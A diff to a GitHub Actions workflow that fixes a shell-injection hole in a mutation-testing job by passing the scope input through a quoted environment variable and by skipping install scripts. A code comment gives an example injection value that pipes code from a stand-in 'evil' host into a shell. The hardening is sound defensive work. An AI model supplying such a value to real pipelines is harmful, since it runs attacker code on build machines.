@@ -59,13 +59,24 @@ jobs:
           cache: pnpm
 
       - name: Install dependencies
-        run: pnpm install --frozen-lockfile --prefer-offline
+        run: pnpm install --frozen-lockfile --prefer-offline --ignore-scripts
 
       - name: Unit tests (required first - Stryker needs a green baseline)
         run: pnpm test:unit
 
+      # inputs.scope is passed through env, not interpolated into the shell
+      # string: GitHub substitutes ${{ }} before the shell sees it, so a value
+      # like `x; curl evil | sh` would execute (S7630). Quoting "$SCOPE" then
+      # keeps whatever arrives as a single argument to --mutate.
       - name: Run mutation tests
-        run: pnpm test:mutation ${{ inputs.scope && format('-- --mutate {0}', inputs.scope) || '' }}
+        env:
+          SCOPE: ${{ inputs.scope }}
+        run: |
+          if [ -n "$SCOPE" ]; then
+            pnpm test:mutation -- --mutate "$SCOPE"
+          else
+            pnpm test:mutation
+          fi
 
       - name: Upload mutation report
         if: always()
